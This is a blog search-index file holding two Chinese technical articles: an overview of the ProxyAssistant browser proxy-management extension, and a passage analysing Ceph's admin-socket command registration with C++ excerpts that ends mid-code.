<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ProxyAssistant - 强大的浏览器代理管理扩展</title>
      <link href="/2026/01/25/proxyassistant/"/>
      <url>/2026/01/25/proxyassistant/</url>
      
        <content type="html"><![CDATA[<p>ProxyAssistant 是一款功能强大的浏览器代理管理扩展，支持 Chrome、Firefox、Edge 等多款浏览器，支持多场景管理，帮助用户轻松配置和切换网络代理。作为一款开源的浏览器扩展，ProxyAssistant 凭借其丰富的功能特性、优秀的用户体验和完善的多语言支持，已成为众多用户管理网络代理的首选工具。</p><h1 id="一、项目概述"><a href="#一、项目概述" class="headerlink" title="一、项目概述"></a>一、项目概述</h1><h2 id="1-1、项目简介"><a href="#1-1、项目简介" class="headerlink" title="1.1、项目简介"></a>1.1、项目简介</h2><p>ProxyAssistant 诞生于对高效代理管理工具的需求。作为一款现代化的浏览器扩展，它采用了最新的 Manifest V3 规范，充分利用了现代浏览器提供的各种 API，为用户提供了一个界面美观、功能完善、操作便捷的代理管理解决方案。项目采用原生 JavaScript 和 jQuery 开发，是一款成熟稳定的代理管理工具。</p><p>该扩展的核心设计理念是”简单易用，功能强大”。无论是需要频繁切换不同代理服务器的用户，还是需要为不同网站配置不同代理规则的高级用户，ProxyAssistant 都能满足其需求。同时，项目完全开源，采用 MIT 许可证，任何人都可以自由使用、修改和分发。</p><p><strong>项目地址</strong>：<a href="https://github.com/bugwz/ProxyAssistant">https://github.com/bugwz/ProxyAssistant</a></p><p><img src="/assets/images/bg/proxyassistant.png" alt="代理助手" loading="lazy"></p><h2 id="1-2、技术栈与架构"><a href="#1-2、技术栈与架构" class="headerlink" title="1.2、技术栈与架构"></a>1.2、技术栈与架构</h2><p>在架构设计上，项目采用了清晰的模块化结构。<code>worker.js</code> 负责代理配置管理和 PAC 脚本生成，<code>popup.js</code> 处理弹窗界面交互，<code>main.js</code> 负责设置页面的完整功能，<code>i18n.js</code> 提供多语言支持。这种分层架构使得代码易于维护和扩展，也便于贡献者理解和参与开发。</p><p>ProxyAssistant 在技术选型上始终坚持简洁高效的原则。项目使用以下核心技术构建：</p><table><thead><tr><th align="center">技术组件</th><th align="center">用途说明</th></tr></thead><tbody><tr><td align="center">原生 JavaScript</td><td align="center">核心业务逻辑开发，确保最佳性能</td></tr><tr><td align="center">jQuery</td><td align="center">DOM 操作和事件处理，简化跨浏览器兼容</td></tr><tr><td align="center">Jest</td><td align="center">单元测试、集成测试和端到端测试框架</td></tr><tr><td align="center">Manifest V3</td><td align="center">Chrome 扩展规范，Service Worker 替代后台页面</td></tr><tr><td align="center">Chrome Storage API</td><td align="center">本地和云端数据存储</td></tr><tr><td align="center">i18n</td><td align="center">完整的国际化支持</td></tr></tbody></table><h2 id="1-3、浏览器兼容性"><a href="#1-3、浏览器兼容性" class="headerlink" title="1.3、浏览器兼容性"></a>1.3、浏览器兼容性</h2><p>ProxyAssistant 对主流浏览器提供了良好的支持：</p><table><thead><tr><th align="center">浏览器</th><th align="center">支持情况</th><th align="center">技术方案</th></tr></thead><tbody><tr><td align="center">Chrome</td><td align="center">✅ 完全支持</td><td align="center">Manifest V3 + Service Worker</td></tr><tr><td align="center">Firefox</td><td align="center">✅ 完全支持</td><td align="center">Manifest V3 + proxy.onRequest API</td></tr><tr><td align="center">Edge</td><td align="center">✅ 兼容支持</td><td align="center">基于 Chromium，可安装 Chrome 扩展</td></tr></tbody></table><p>值得注意的是，Firefox 版本要求最低版本为 142.0，这是为了确保能够完整支持所需的扩展 API。对于需要跨浏览器使用的用户，ProxyAssistant 提供了统一的配置同步功能，可以在不同浏览器间无缝迁移代理配置。</p><h1 id="二、核心功能特性"><a href="#二、核心功能特性" class="headerlink" title="二、核心功能特性"></a>二、核心功能特性</h1><h2 id="2-1、多协议代理支持"><a href="#2-1、多协议代理支持" class="headerlink" title="2.1、多协议代理支持"></a>2.1、多协议代理支持</h2><p>ProxyAssistant 支持市场上主流的代理协议，满足不同场景的需求：</p><table><thead><tr><th align="center">协议类型</th><th align="center">支持情况</th><th align="center">应用场景</th></tr></thead><tbody><tr><td align="center">HTTP</td><td align="center">✅ 完全支持</td><td align="center">传统网页浏览，兼容性最好</td></tr><tr><td align="center">HTTPS</td><td align="center">✅ 完全支持</td><td align="center">安全加密传输，保护隐私</td></tr><tr><td align="center">SOCKS5</td><td align="center">✅ 完全支持</td><td align="center">支持 TCP 和 UDP 协议，应用广泛</td></tr><tr><td align="center">SOCKS4</td><td align="center">✅ 完全支持</td><td align="center">兼容旧版系统和应用</td></tr></tbody></table><p>每种协议都支持完整的认证功能（注意：受限于Chrome的约束， SOCKS5 的连接认证），用户可以为代理服务器配置用户名和密码，扩展会自动处理认证请求，确保安全可靠地使用代理服务。这种多协议支持使得 ProxyAssistant 能够适应各种复杂的网络环境和代理服务提供商。</p><h2 id="2-2、三种代理状态"><a href="#2-2、三种代理状态" class="headerlink" title="2.2、三种代理状态"></a>2.2、三种代理状态</h2><p>为了满足不同用户的使用习惯和需求，ProxyAssistant 提供了三种代理状态：</p><table><thead><tr><th align="center">状态</th><th align="center">描述</th><th align="center">适用场景</th></tr></thead><tbody><tr><td align="center">禁用</td><td align="center">禁用代理，使用系统默认网络连接</td><td align="center">需要直接访问本地网络时</td></tr><tr><td align="center">手动</td><td align="center">从列表中手动选择代理</td><td align="center">单一代理固定使用</td></tr><tr><td align="center">自动</td><td align="center">根据 URL 规则自动选择匹配代理</td><td align="center">不同网站使用不同代理</td></tr></tbody></table><p>自动模式是 ProxyAssistant 的一大特色功能。用户可以为每个代理配置 URL 规则，包括”不走代理的地址”和”走代理的地址”。系统会根据访问的网站自动选择合适的代理，实现了智能路由功能。例如，可以让国内网站直连，特定国外网站走代理，大大提高了使用的灵活性。</p><h2 id="2-3、自定义场景模式"><a href="#2-3、自定义场景模式" class="headerlink" title="2.3、自定义场景模式"></a>2.3、自定义场景模式</h2><p>场景模式是 ProxyAssistant 1.5.0 版本引入的重大功能更新，它允许用户创建不同的代理配置集合：</p><ul><li><strong>多场景支持</strong>：可以创建如”公司”、”家庭”、”开发环境”等不同场景</li><li><strong>快速切换</strong>：一键在不同场景间切换代理列表，无需重复配置</li><li><strong>灵活管理</strong>：支持场景的新增、重命名、删除及排序</li><li><strong>代理迁移</strong>：支持将代理在不同场景间移动，方便整理</li></ul><p>这种设计非常适合需要在多个网络环境间切换的用户。例如，在公司使用公司提供的代理，在家使用科学上网代理，通过场景切换可以瞬间完成代理配置的变更，极大提升了使用效率。</p><h2 id="2-4、数据同步"><a href="#2-4、数据同步" class="headerlink" title="2.4、数据同步"></a>2.4、数据同步</h2><p>ProxyAssistant 支持两种同步方式: <strong>浏览器原生同步</strong> 和 <strong>Github Gist 同步</strong>。</p><h3 id="2-4-1、浏览器原生同步"><a href="#2-4-1、浏览器原生同步" class="headerlink" title="2.4.1、浏览器原生同步"></a>2.4.1、浏览器原生同步</h3><p>使用浏览器账号进行数据同步：</p><ul><li>Chrome 使用 <code>chrome.storage.sync</code> API</li><li>Firefox 使用 <code>browser.storage.sync</code> API</li><li>自动通过 Chrome&#x2F;Firefox 账号同步</li><li>分块存储：配置数据自动分块（每块 7KB），绕过 8KB 单项配额限制</li><li>数据校验：使用校验和确保同步数据的完整性</li><li>原子操作：Push 操作先清空旧数据再写入新数据，保证一致性</li><li>配额显示：实时显示已用&#x2F;总配额（100KB）和分块数量</li></ul><h3 id="2-4-2、GitHub-Gist-同步"><a href="#2-4-2、GitHub-Gist-同步" class="headerlink" title="2.4.2、GitHub Gist 同步"></a>2.4.2、GitHub Gist 同步</h3><p>通过 GitHub Gist 实现跨浏览器同步：</p><ul><li>需要配置 GitHub Personal Access Token</li><li>支持手动 push&#x2F;pull 或自动同步</li><li>配置内容加密存储，导出时自动清除敏感信息</li></ul><table><thead><tr><th align="center">配置项</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">访问密钥</td><td align="center">GitHub Personal Access Token（需具有 gist 权限）</td></tr><tr><td align="center">文件名</td><td align="center">Gist 中的文件名，默认为 <code>proxy_assistant_config.json</code></td></tr><tr><td align="center">Gist ID</td><td align="center">自动识别保存，无需手动输入</td></tr></tbody></table><h2 id="2-5、数据导入和导出"><a href="#2-5、数据导入和导出" class="headerlink" title="2.5、数据导入和导出"></a>2.5、数据导入和导出</h2><p>ProxyAssistant 提供了完善的导入导出功能：</p><ul><li><strong>导出配置</strong>：生成包含所有代理信息、主题设置、语言设置等信息的 JSON 文件</li><li><strong>导入配置</strong>：支持从 JSON 文件恢复配置</li><li><strong>数据安全</strong>：导出文件自动清除敏感信息（Token、密码）</li><li><strong>格式兼容</strong>：支持导入旧版本配置文件</li></ul><p>导出功能使得配置分享变得非常简单。用户可以将自己的代理配置导出为 JSON 文件，分享给团队成员或在其他设备上导入使用，既方便又安全。</p><h2 id="2-6、主题模式"><a href="#2-6、主题模式" class="headerlink" title="2.6、主题模式"></a>2.6、主题模式</h2><p>ProxyAssistant 提供了完整的主题支持：</p><table><thead><tr><th align="center">主题类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">白天模式</td><td align="center">适合白天使用，界面清爽明亮</td></tr><tr><td align="center">夜间模式</td><td align="center">适合夜间使用，减少眼睛疲劳</td></tr><tr><td align="center">自动切换</td><td align="center">根据配置的时间段自动切换主题</td></tr></tbody></table><p>用户可以根据自己的使用习惯和喜好选择合适的主题模式，也可以设置自动切换，让扩展根据时间自动调整界面风格，体现了产品设计的人文关怀。</p><h2 id="2-7、多语言支持"><a href="#2-7、多语言支持" class="headerlink" title="2.7、多语言支持"></a>2.7、多语言支持</h2><p>ProxyAssistant 在国际化方面做得非常出色，目前支持 10 种语言：</p><table><thead><tr><th align="center">语言</th><th align="center">代码</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center">简体中文</td><td align="center">zh-CN</td><td align="center">✅ 已支持</td></tr><tr><td align="center">繁體中文</td><td align="center">zh-TW</td><td align="center">✅ 已支持</td></tr><tr><td align="center">English</td><td align="center">en</td><td align="center">✅ 已支持</td></tr><tr><td align="center">日本語</td><td align="center">ja</td><td align="center">✅ 已支持</td></tr><tr><td align="center">Français</td><td align="center">fr</td><td align="center">✅ 已支持</td></tr><tr><td align="center">Deutsch</td><td align="center">de</td><td align="center">✅ 已支持</td></tr><tr><td align="center">Español</td><td align="center">es</td><td align="center">✅ 已支持</td></tr><tr><td align="center">Português</td><td align="center">pt</td><td align="center">✅ 已支持</td></tr><tr><td align="center">Русский</td><td align="center">ru</td><td align="center">✅ 已支持</td></tr><tr><td align="center">한국어</td><td align="center">ko</td><td align="center">✅ 已支持</td></tr></tbody></table><p>国际化实现结合了 Chrome i18n API 和自管理的语言包，确保用户可以在扩展内实时切换语言。这种广泛的多语言支持使得 ProxyAssistant 能够服务于全球各地的用户。</p><h1 id="三、安装与使用"><a href="#三、安装与使用" class="headerlink" title="三、安装与使用"></a>三、安装与使用</h1><h2 id="3-1-安装方式"><a href="#3-1-安装方式" class="headerlink" title="3.1 安装方式"></a>3.1 安装方式</h2><h3 id="3-1-1、Chrome-浏览器"><a href="#3-1-1、Chrome-浏览器" class="headerlink" title="3.1.1、Chrome 浏览器"></a>3.1.1、Chrome 浏览器</h3><p><strong>方式一（推荐）</strong>：从 Chrome 官方商店安装</p><ol><li>打开 Chrome，访问 Chrome 网上应用商店</li><li>搜索”代理助手”，或直接访问 <a href="https://chromewebstore.google.com/detail/%E4%BB%A3%E7%90%86%E5%8A%A9%E6%89%8B/mfemgikpcpndehimgkjghpcofjcgdhdk?hl=zh-CN&utm_source=ext_sidebar">代理助手</a></li><li>点击”添加至 Chrome”</li></ol><p><strong>方式二</strong>：本地安装</p><ol><li>前往 GitHub Releases 页面</li><li>下载 <code>proxy-assistant-chrome-x.x.x.zip</code> 文件</li><li>解压后加载 <code>src</code> 目录</li></ol><h3 id="3-1-2、Firefox-浏览器"><a href="#3-1-2、Firefox-浏览器" class="headerlink" title="3.1.2、Firefox 浏览器"></a>3.1.2、Firefox 浏览器</h3><p><strong>方式一（推荐）</strong>：从 Firefox 官方附加组件安装</p><ol><li>打开 Firefox，访问 Firefox 附加组件</li><li>搜索”代理助手”，或直接访问 <a href="https://addons.mozilla.org/zh-CN/firefox/addon/proxyassistant/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search">代理助手</a></li><li>点击”添加到 Firefox”</li></ol><p><strong>方式二</strong>：本地安装</p><ol><li>从 release 目录下载 Firefox 扩展安装包（<code>.xpi</code> 文件）</li><li>在附加组件页面从文件安装</li></ol><h3 id="3-1-3、Microsoft-Edge"><a href="#3-1-3、Microsoft-Edge" class="headerlink" title="3.1.3、Microsoft Edge"></a>3.1.3、Microsoft Edge</h3><p>Edge 浏览器基于 Chromium 内核，可以直接安装 Chrome 扩展：</p><ol><li>访问 <code>edge://extensions/</code></li><li>开启开发者模式</li><li>加载 Chrome 扩展或从 Chrome 网上应用店安装，或直接访问 <a href="https://chromewebstore.google.com/detail/%E4%BB%A3%E7%90%86%E5%8A%A9%E6%89%8B/mfemgikpcpndehimgkjghpcofjcgdhdk?hl=zh-CN&utm_source=ext_sidebar">代理助手</a></li></ol><h2 id="3-2-使用指南"><a href="#3-2-使用指南" class="headerlink" title="3.2 使用指南"></a>3.2 使用指南</h2><ol><li><strong>添加代理</strong>：点击扩展图标 → 设置 → 新增代理 → 填写代理信息</li><li><strong>使用代理</strong>：<ul><li>手动模式：从列表中选择代理</li><li>自动模式：配置 URL 规则，自动匹配</li></ul></li><li><strong>场景切换</strong>：在弹窗中切换不同场景</li><li><strong>导入导出</strong>：设置页面支持配置文件的导入导出</li></ol><h1 id="四、开发与测试"><a href="#四、开发与测试" class="headerlink" title="四、开发与测试"></a>四、开发与测试</h1><h2 id="4-1-项目结构"><a href="#4-1-项目结构" class="headerlink" title="4.1 项目结构"></a>4.1 项目结构</h2><p>ProxyAssistant 采用清晰的项目结构，便于开发和维护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ProxyAssistant/<br>├── conf/                     # 示例配置<br>├── readme/                   # 多语言文档<br>├── src/                      # 源代码<br>│   ├── manifest_chrome.json  # Chrome 扩展配置<br>│   ├── manifest_firefox.json # Firefox 扩展配置<br>│   ├── main.html             # 设置页面<br>│   ├── popup.html            # 弹窗页面<br>│   ├── js/<br>│   │   ├── main.js           # 设置页面主逻辑<br>│   │   ├── popup.js          # 弹窗 UI 逻辑<br>│   │   ├── worker.js         # Service Worker<br>│   │   ├── i18n.js           # 国际化支持<br>│   │   └── jquery.js         # jQuery 库<br>│   ├── css/<br>│   │   ├── main.css          # 设置页面样式<br>│   │   ├── popup.css         # 弹窗样式<br>│   │   ├── theme.css         # 主题样式<br>│   │   └── eye-button.css    # 显示密码按钮样式<br>│   └── images/               # 图片资源<br>├── tests/                    # 测试目录<br>│   ├── jest.config.js        # Jest 测试配置<br>│   ├── setup.js              # 测试环境设置<br>│   ├── __mocks__/            # Mock 文件<br>│   ├── unit/                 # 单元测试<br>│   ├── integration/          # 集成测试<br>│   └── e2e/                  # 端到端测试<br>├── build/                    # 构建产物目录<br>├── package.json              # 项目依赖配置<br>├── Makefile                  # 构建命令入口<br>└── AGENTS.md                 # 开发指南<br></code></pre></td></tr></table></figure><h2 id="4-2-测试框架"><a href="#4-2-测试框架" class="headerlink" title="4.2 测试框架"></a>4.2 测试框架</h2><p>ProxyAssistant 使用 Jest 作为测试框架，建立了完整的测试体系：</p><table><thead><tr><th align="center">测试类型</th><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">单元测试</td><td align="center"><code>make test_unit</code></td><td align="center">测试核心功能模块</td></tr><tr><td align="center">集成测试</td><td align="center"><code>make test_integration</code></td><td align="center">测试模块间交互</td></tr><tr><td align="center">端到端测试</td><td align="center"><code>make test_e2e</code></td><td align="center">测试完整用户流程</td></tr><tr><td align="center">全部测试</td><td align="center"><code>make test</code></td><td align="center">运行所有测试</td></tr><tr><td align="center">覆盖率报告</td><td align="center"><code>npm run test:coverage</code></td><td align="center">生成测试覆盖率报告</td></tr></tbody></table><p>项目还提供了监听模式 (<code>npm run test:watch</code>)，支持开发过程中实时运行测试，确保代码质量。</p><h2 id="4-3-构建流程"><a href="#4-3-构建流程" class="headerlink" title="4.3 构建流程"></a>4.3 构建流程</h2><p>ProxyAssistant 提供了完整的构建脚本：</p><table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>make build</code></td><td align="center">构建 Chrome 和 Firefox 扩展</td></tr><tr><td align="center"><code>make build VERSION=dev</code></td><td align="center">指定版本号构建</td></tr><tr><td align="center"><code>make clean</code></td><td align="center">清理构建产物</td></tr></tbody></table><p>构建产物包括：</p><ul><li><code>ProxyAssistant_{VERSION}_chrome.zip</code> - Chrome 安装包</li><li><code>ProxyAssistant_{VERSION}_chrome.tar.gz</code> - Chrome 源码包</li><li><code>ProxyAssistant_{VERSION}_firefox.zip</code> - Firefox 安装包</li><li><code>ProxyAssistant_{VERSION}_firefox.tar.gz</code> - Firefox 源码包</li><li><code>ProxyAssistant_{VERSION}_firefox.xpi</code> - Firefox 官方扩展包</li></ul><h2 id="4-4-代码规范"><a href="#4-4-代码规范" class="headerlink" title="4.4 代码规范"></a>4.4 代码规范</h2><p>项目遵循严格的代码规范：</p><ul><li><strong>缩进</strong>：2 个空格</li><li><strong>引号</strong>：单引号</li><li><strong>命名</strong>：小驼峰 (camelCase)，常量使用大写下划线</li><li><strong>分号</strong>：一致使用</li></ul><p>详细的开发规范请参考 <a href="AGENTS.md">AGENTS.md</a>。</p><h1 id="五、应用场景"><a href="#五、应用场景" class="headerlink" title="五、应用场景"></a>五、应用场景</h1><h2 id="5-1-多代理切换"><a href="#5-1-多代理切换" class="headerlink" title="5.1 多代理切换"></a>5.1 多代理切换</h2><p>对于需要在不同网络环境间切换的用户，ProxyAssistant 提供了便捷的解决方案：</p><ul><li>为不同网络环境配置不同代理</li><li>办公网络使用公司代理</li><li>家庭网络使用科学上网代理</li><li>一键快速切换，无需重复配置</li></ul><h2 id="5-2-智能路由"><a href="#5-2-智能路由" class="headerlink" title="5.2 智能路由"></a>5.2 智能路由</h2><p>ProxyAssistant 的自动模式和 URL 规则配置功能实现了智能路由：</p><ul><li>国内网站直连，享受最快速度</li><li>特定网站走代理，突破网络限制</li><li>根据域名自动选择，无需手动切换</li></ul><h2 id="5-3-团队共享"><a href="#5-3-团队共享" class="headerlink" title="5.3 团队共享"></a>5.3 团队共享</h2><p>ProxyAssistant 的导入导出功能便于团队协作：</p><ul><li>导出配置文件</li><li>分享给团队成员</li><li>保持统一的代理配置</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 浏览器扩展 </tag>
            
            <tag> 代理管理 </tag>
            
            <tag> Chrome Extension </tag>
            
            <tag> Firefox Addon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph 命令注册及执行流程</title>
      <link href="/2025/12/06/ceph-cmd-register-exec/"/>
      <url>/2025/12/06/ceph-cmd-register-exec/</url>
      
        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>本文的内容基于 Ceph <a href="https://github.com/ceph/ceph/tree/v20.2.0">v20.2.0</a> 版本进行分析。</p><p>分析 <code>ceph -h</code> 的输出信息可以看到，其支持两种类型的命令，分别是 <strong>Local Commands</strong> 和 <strong>Monitor Commands</strong>。其中 <strong>Local Commands</strong> 比较典型的就是 <code>ceph daemon {type.id|path} &lt;cmd&gt;</code> 命令，用于直接和本地组件的 socket 进行通信，执行一些命令。而 <strong>Monitor Commands</strong> 则是将相关命令发送给 Monitor，有些是由 Monitor 自身处理该命令并返回，也有一些只是经由 Monitor 中转给其他组件执行（比如 <code>ceph tell osd.0 *</code> 等命令）。</p><ul><li>对于 <strong>Local Commands</strong>，我们分析每个组件（MON&#x2F;MGR&#x2F;OSD&#x2F;MDS）的 admin socket 命令的注册和执行流程；</li><li>对于 <strong>Monitor Commands</strong>，我们分析</li></ul><h1 id="二、Local-Commands-分析"><a href="#二、Local-Commands-分析" class="headerlink" title="二、Local Commands 分析"></a>二、Local Commands 分析</h1><p>对于本地的命令，我们仅分析每个组件的 admin socket 的命令注册和执行的流程。注意：虽然 <code>ceph daemon {type.id|path} &lt;cmd&gt;</code> 和 <code>ceph tell &lt;type.id&gt; &lt;args&gt;...</code> 可以达到相同的效果，但是两个命令的执行链路并不相同。</p><h2 id="2-1、命令注册流程"><a href="#2-1、命令注册流程" class="headerlink" title="2.1、命令注册流程"></a>2.1、命令注册流程</h2><ul><li>所有注册的命令存储在 AdminSocket 类的成员变量 hooks 中，其类型为 std::multimap&lt;std::string, hook_info, std::less&lt;&gt;&gt;；</li><li>所有 admin socket 命令都是通过执行 AdminSocket::register_command 函数注册的，注册时允许重复 key ，但是要求相同命令的 desc 要不同；</li><li>之后通过调用 common_init_finish 和 AdminSocket::init 函数来初始化对应的 Unix Socket；</li><li>AdminSocket::init 函数内部会启动一个 admin_socket 的线程来接受和处理 socket 请求，对应的线程入口函数为 AdminSocket::entry ；</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">AdminSocket::register_command</span><span class="hljs-params">(std::string_view cmddesc,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  AdminSocketHook *hook,</span></span><br><span class="hljs-params"><span class="hljs-function">                                  std::string_view help)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> ret;<br>  <span class="hljs-function">std::unique_lock <span class="hljs-title">l</span><span class="hljs-params">(lock)</span></span>;<br>  string prefix = <span class="hljs-built_in">cmddesc_get_prefix</span>(cmddesc);<br>  <span class="hljs-keyword">auto</span> i = hooks.<span class="hljs-built_in">find</span>(prefix);<br>  <span class="hljs-keyword">if</span> (i != hooks.<span class="hljs-built_in">cend</span>() &amp;&amp;<br>      i-&gt;second.desc == cmddesc)<br>  &#123;<br>    <span class="hljs-built_in">ldout</span>(m_cct, <span class="hljs-number">5</span>) &lt;&lt; <span class="hljs-string">&quot;register_command &quot;</span> &lt;&lt; prefix<br>                    &lt;&lt; <span class="hljs-string">&quot; cmddesc &quot;</span> &lt;&lt; cmddesc &lt;&lt; <span class="hljs-string">&quot; hook &quot;</span> &lt;&lt; hook<br>                    &lt;&lt; <span class="hljs-string">&quot; EEXIST&quot;</span> &lt;&lt; dendl;<br>    ret = -EEXIST;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">ldout</span>(m_cct, <span class="hljs-number">5</span>) &lt;&lt; <span class="hljs-string">&quot;register_command &quot;</span> &lt;&lt; prefix &lt;&lt; <span class="hljs-string">&quot; hook &quot;</span> &lt;&lt; hook<br>                    &lt;&lt; dendl;<br>    hooks.<span class="hljs-built_in">emplace_hint</span>(i,<br>                       std::piecewise_construct,<br>                       std::forward_as_tuple(prefix),<br>                       std::forward_as_tuple(hook, cmddesc, help));<br>    ret = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-1、MON"><a href="#2-1-1、MON" class="headerlink" title="2.1.1、MON"></a>2.1.1、MON</h3><p>monitor 服务的启动服务入口为 <code>src/ceph_mon.cc</code> 文件。</p><p><strong>注册命令的函数:</strong></p><ul><li><strong>CephContext::CephContext 构造函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>config</code> 等命令，注意其中有些命令的 help 字段内容为空，当使用客户端获取可执行的命令，这些命令并不会在命令列表中展示，但是仍然可以被执行；</li><li><strong>MempoolObs::MempoolObs 构造函数</strong> : 其中仅注册了一个 <code>dump_mempools</code> 命令；</li><li><strong>AdminSocket::init 函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>version</code>，<code>git_version</code>， <code>help</code> 等命令，其中 <code>help</code> 命令在输出可用命令时会过滤每个已注册命令的 help 字段，如果为空则不输出对应的命令；</li><li><strong>AsyncMessenger::AsyncMessenger 构造函数</strong> : 其中仅注册了一个 <code>messenger dump</code> 命令；</li><li><strong>Monitor::preinit 函数</strong> : 其中注册了大量的使用 COMMAND_WITH_FLAG 宏定义的带有 FLAG(TELL) 的命令；</li></ul><p><strong>注册命令的函数调用链路:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">+ main -&gt; global_init -&gt; global_pre_init -&gt; common_preinit -&gt; CephContext::CephContext -&gt; register_command<br>+ CephContext::CephContext -&gt; MempoolObs::MempoolObs -&gt; register_command<br>+ main -&gt; common_init_finish -&gt; CephContext::start_service_thread -&gt; AdminSocket::init -&gt; register_command<br>+ main -&gt; Messenger::create -&gt; AsyncMessenger::AsyncMessenger -&gt; register_command<br>+ main -&gt; Monitor::preinit -&gt; register_command<br></code></pre></td></tr></table></figure><p><strong>注册命令的函数调用链路示意图:</strong></p><pre><code class="hljs mermaid">graph TD    %% 定义样式    classDef outerNode fill:#e1f5f,stroke:#01579b,stroke-width:1px    classDef middleNode fill:#fff3e0,stroke:#e65100,stroke-width:1px    classDef finalNode fill:#e8f5e8,stroke:#2e7d32,stroke-width:1px    %% 主入口节点    main[main]:::outerNode    %% 最长的中间链路（居中）    main --&gt; global_init[global_init]:::middleNode    global_init --&gt; global_pre_init[global_pre_init]:::middleNode    global_pre_init --&gt; common_preinit[common_preinit]:::middleNode    common_preinit --&gt; CephContext_CephContext[CephContext::CephContext]:::middleNode    CephContext_CephContext --&gt; register_command1[register_command]:::finalNode    %% 从CephContext::CephContext分叉的链路    CephContext_CephContext --&gt; MempoolObs_MempoolObs[MempoolObs::MempoolObs]:::middleNode    MempoolObs_MempoolObs --&gt; register_command2[register_command]:::finalNode    %% 从main分叉的较短链路（右侧）    main --&gt; common_init_finish[common_init_finish]:::middleNode    common_init_finish --&gt; CephContext_start_service_thread[CephContext::start_service_thread]:::middleNode    CephContext_start_service_thread --&gt; AdminSocket_init[AdminSocket::init]:::middleNode    AdminSocket_init --&gt; register_command3[register_command]:::finalNode    %% 从main分叉的较短链路（左侧）    main --&gt; Messenger_create[Messenger::create]:::middleNode    Messenger_create --&gt; AsyncMessenger_AsyncMessenger[AsyncMessenger::AsyncMessenger]:::middleNode    AsyncMessenger_AsyncMessenger --&gt; register_command4[register_command]:::finalNode    %% 从main分叉的最短链路（最左侧）    main --&gt; Monitor_preinit[Monitor::preinit]:::middleNode    Monitor_preinit --&gt; register_command5[register_command]:::finalNode    %% 对齐所有最终节点    register_command1    register_command2    register_command3    register_command4    register_command5</code></pre><p><strong>相关代码:</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">undef</span> FLAG</span><br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> COMMAND</span><br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> COMMAND_WITH_FLAG</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG(f) (MonCommand::FLAG_##f)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMAND(parsesig, helptext, modulename, req_perms) \</span><br><span class="hljs-meta">  &#123;parsesig, helptext, modulename, req_perms, FLAG(NONE)&#125;,</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMAND_WITH_FLAG(parsesig, helptext, modulename, req_perms, flags) \</span><br><span class="hljs-meta">  &#123;parsesig, helptext, modulename, req_perms, flags&#125;,</span><br>MonCommand mon_commands[] = &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mon/MonCommands.h&gt;</span></span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> COMMAND</span><br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> COMMAND_WITH_FLAG</span><br></code></pre></td></tr></table></figure><h3 id="2-1-2、MGR"><a href="#2-1-2、MGR" class="headerlink" title="2.1.2、MGR"></a>2.1.2、MGR</h3><p>manager 服务的启动服务入口为 <code>src/ceph_mgr.cc</code> 文件。</p><p><strong>注册命令的函数:</strong></p><ul><li><strong>CephContext::CephContext 构造函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>config</code> 等命令，注意其中有些命令的 help 字段内容为空，当使用客户端获取可执行的命令，这些命令并不会在命令列表中展示，但是仍然可以被执行；</li><li><strong>MempoolObs::MempoolObs 构造函数</strong> : 其中仅注册了一个 <code>dump_mempools</code> 命令；</li><li><strong>AdminSocket::init 函数</strong> : 内部注册了一些各组件通用的命令，比如 <code>version</code>，<code>git_version</code>， <code>help</code> 等命令，其中 <code>help</code> 命令在输出可用命令时会过滤每个已注册命令的 help 字段，如果为空则不输出对应的命令；</li><li><strong>AsyncMessenger::AsyncMessenger 构造函数</strong> : 其中仅注册了一个 <code>messenger dump</code> 命令；</li><li><strong>MgrStandby::init 函数</strong> : 其中仅注册了一个 <code>status</code> 命令；</li><li><strong>MonClient::init 函数</strong> : 其中仅注册了一个 <code>rotate-key</code> 命令；</li><li><strong>Objecter::init 函数</strong> : 其中仅注册了一个 <code>objecter_requests</code> 命令；</li><li><strong>Mgr::init 函数</strong> : 其中仅注册了一个 <code>mgr_status</code> 命令；</li><li><strong>DaemonServer::init 函数</strong> : 其中注册了一些使用 <code>dump_</code> 为前缀的命令；</li><li><strong>ClusterState::final_init 函数</strong> : 其中仅注册了一个 <code>dump_osd_network</code> 命令；</li></ul><p><strong>注册命令的函数调用链路:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">+ main -&gt; global_init -&gt; global_pre_init -&gt; common_preinit -&gt; CephContext::CephContext -&gt; register_command<br>+ CephContext::CephContext -&gt; 